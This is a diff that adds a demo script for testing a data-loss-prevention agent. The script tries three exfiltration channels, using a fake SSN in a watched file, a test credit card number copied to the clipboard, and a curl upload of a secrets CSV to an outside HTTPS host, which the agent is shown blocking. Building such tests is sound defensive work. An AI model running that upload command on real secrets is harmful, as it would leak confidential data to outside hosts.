@@ -1,0 +1,14 @@
+# ASSEMBLED DEMO — run these in a SECOND terminal while ./test/run_agent.sh runs in the first.
+# One agent catches all three exfil channels.
+
+# 1) FILE — write a report with an SSN into the watched folder:
+printf 'name,ssn\nJane,SSN 123-45-6789\n' > /tmp/dlp-test/report.csv
+#    agent -> file=/tmp/dlp-test/report.csv ... level=1
+
+# 2) CLIPBOARD — copy a credit card:
+printf 'card 4242424242424242' | xclip -selection clipboard
+#    agent -> source=1 ... level=2 text=[card 4242424242424242]
+
+# 3) NETWORK — try to exfiltrate the secret over HTTPS:
+curl -T /tmp/dlp-lab/secrets/hr.csv -m 5 https://1.1.1.1
+#    curl: Failed to connect after 0 ms   +   agent -> [DLP] BLOCK ... level 2
